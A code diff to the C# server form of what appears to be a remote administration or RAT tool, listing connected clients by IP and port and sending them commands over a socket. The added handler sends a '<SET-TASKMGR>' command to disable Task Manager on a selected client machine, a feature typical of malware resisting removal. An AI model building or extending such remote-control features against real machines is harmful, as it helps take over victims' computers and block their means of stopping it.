@@ -5,7 +5,7 @@ namespace Server
     public partial class Main : Form
     {
         private readonly ImageList imageList;
-        private readonly SocketServer socketServer;
+        public readonly SocketServer socketServer;
         #pragma warning disable CS8618
             public static RequestUI uiRequests;
 #pragma warning restore CS8618
@@ -25,6 +25,7 @@ namespace Server
                 szIPAddress = text.Split("<SPLIT>")[1],
                 szPort = text.Split("<SPLIT>")[2];
 
+            // Add data to viewList.
             Bitmap image;
             image = Properties.Resources.user;
             imageList.Images.Add(image);
@@ -92,8 +93,18 @@ namespace Server
 
         private void userMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
         {
-            if(userView.SelectedItems.Count == 0) // No items selected, no need to open.
+            if (userView.SelectedItems.Count == 0) // No items selected, no need to open.
+            {
                 e.Cancel = true;
+                return;
+            }
+        }
+
+        private void disableTaskmanagerToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
+        {
+            string messageBoxStr
+                = "<SET-TASKMGR>" + Convert.ToInt32(disableTaskmanagerToolStripMenuItem.Checked).ToString() + "<EOF>";
+            socketServer.Send(socketServer.GetClient(userView.SelectedItems[0].Index).socket, messageBoxStr);
         }
     }
 }
